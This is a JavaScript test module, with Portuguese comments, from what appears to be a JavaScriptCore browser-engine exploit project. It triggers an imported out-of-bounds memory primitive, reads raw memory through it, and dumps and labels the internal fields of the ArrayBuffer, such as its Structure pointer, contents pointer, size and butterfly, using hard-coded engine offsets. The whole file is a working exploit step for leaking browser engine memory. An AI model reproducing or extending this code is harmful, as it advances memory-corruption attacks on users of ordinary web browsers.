// js/script3/testDumpArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute, // Não usado diretamente para escrita neste teste, mas core_exploit é necessário
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeDumpArrayBufferStructureTest() {
    const FNAME_TEST = "executeDumpArrayBufferStructureTest";
    logS3(`--- Iniciando Teste: Dump da Estrutura Inicial do oob_array_buffer_real ---`, "test", FNAME_TEST);
    document.title = `Dump AB Structure`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`oob_array_buffer_real configurado. Tamanho total via JS: ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);
    
    // 1. Forçar inicialização completa do oob_array_buffer_real
    logS3("1. Forçando inicialização completa do oob_array_buffer_real...", "info", FNAME_TEST);
    try {
        if (oob_array_buffer_real.byteLength > 0) {
            const temp_dv = new DataView(oob_array_buffer_real);
            temp_dv.setUint8(0, 0x01); // Escreve um byte no início do buffer de dados real
            logS3("   Escrita de um byte no oob_array_buffer_real (via DataView) para forçar inicialização, realizada.", "good", FNAME_TEST);
        } else {
            logS3("   oob_array_buffer_real tem tamanho 0, pulando escrita de inicialização.", "warn", FNAME_TEST);
        }
    } catch (e_init) {
        logS3(`   ERRO ao tentar forçar inicialização do oob_array_buffer_real: ${e_init.message}`, "error", FNAME_TEST);
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    // 2. Dump dos primeiros 64 bytes do oob_array_buffer_real
    const bytesToDump = Math.min(64, oob_array_buffer_real.byteLength);
    logS3(`--- 2. Dump dos Primeiros ${bytesToDump} Bytes do oob_array_buffer_real (lendo como QWORDs de 8 bytes) ---`, "subtest", FNAME_TEST);
    
    let expected_offsets_info = "";
    try {
        const cellStructurePtrOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
        const abContentsImplPtrOffset = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16);
        const abSizeOffset = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
        
        expected_offsets_info += `Offsets esperados (de config.mjs):\n`;
        expected_offsets_info += `  - JSCell.STRUCTURE_POINTER_OFFSET: ${toHex(cellStructurePtrOffset)}\n`;
        expected_offsets_info += `  - ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET: ${toHex(abContentsImplPtrOffset)}\n`;
        expected_offsets_info += `  - ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: ${toHex(abSizeOffset)}`;
        logS3(expected_offsets_info, "info", FNAME_TEST);
    } catch (e) {
        logS3("Erro ao parsear offsets do config.mjs para logging.", "warn", FNAME_TEST);
    }


    for (let current_offset = 0; current_offset < bytesToDump; current_offset += 8) {
        if (current_offset + 8 > oob_array_buffer_real.byteLength) {
            logS3(`   Não é possível ler 8 bytes completos em ${toHex(current_offset)}, dump parcial pode ocorrer abaixo ou ser pulado.`, "info", FNAME_TEST);
            // Se quisermos ler os bytes restantes individualmente:
            let remainingBytesStr = "";
            for (let rem_offset = current_offset; rem_offset < oob_array_buffer_real.byteLength; rem_offset++) {
                try {
                    remainingBytesStr += toHex(oob_read_absolute(rem_offset, 1), 8) + " ";
                } catch (e_rem) {
                    remainingBytesStr += "ERR ";
                }
            }
            if (remainingBytesStr) {
                 logS3(`   Offset ${toHex(current_offset)} - ${toHex(oob_array_buffer_real.byteLength -1)} (bytes restantes): ${remainingBytesStr}`, "leak", FNAME_TEST);
            }
            break;
        }
        try {
            const val = oob_read_absolute(current_offset, 8);
            let interpretation = "";
            if (current_offset === parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16)) {
                interpretation = " (Esperado: Structure*)";
            } else if (current_offset === parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16)) {
                interpretation = " (Esperado: ContentsImpl* / m_impl)";
            } else if (current_offset === parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16)) {
                interpretation = " (Esperado: Tamanho JSArrayBuffer)";
            } else if (current_offset === parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16)) {
                interpretation = " (Esperado: Butterfly*)";
            }


            if (isAdvancedInt64Object(val)) {
                logS3(`   Offset ${toHex(current_offset)} - ${toHex(current_offset + 7)}: ${val.toString(true)} (L: ${toHex(val.low())} H: ${toHex(val.high())})${interpretation}`, "leak", FNAME_TEST);
            } else {
                logS3(`   Offset ${toHex(current_offset)}: Leitura de 8 bytes não retornou AdvancedInt64.`, "warn", FNAME_TEST);
            }
        } catch (e) {
            logS3(`   Erro ao ler 8 bytes do offset ${toHex(current_offset)}: ${e.message}`, "error", FNAME_TEST);
        }
        if (current_offset < bytesToDump - 8) { 
             await PAUSE_S3(5); 
        }
    }

    logS3(`--- Teste Dump da Estrutura Inicial CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Dump AB Structure Done`;
    clearOOBEnvironment();
}
